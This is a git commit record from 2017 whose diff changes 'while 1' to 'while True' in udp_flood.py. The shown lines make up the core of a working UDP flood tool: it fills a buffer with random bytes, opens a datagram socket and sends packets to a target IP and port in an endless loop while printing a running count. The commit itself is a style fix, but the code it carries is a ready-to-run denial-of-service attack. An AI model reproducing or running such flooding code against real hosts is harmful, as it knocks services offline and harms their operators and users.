aeae06a2903f127cba74172c6afa3f6f5f9e9417
Caleb-Shepard <cshepard6055@floridapoly.edu>
2017-09-28 16:57:36 -0400

    Changed to while True; more pythonic

--- udp_flood.py
+++ udp_flood.py
@@ -11,7 +11,7 @@ sent=1
 bytes=random._urandom(1024) # determine size before loop
 sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
 
-while 1: # Infinite loop
+while True: # Infinite loop
     sock.sendto(bytes,(ip,port)) # send packet
     print "Sent %s packets to %s at port %s." % (sent,ip,port) # comment this line if you don't want to print
     sent=sent + 1
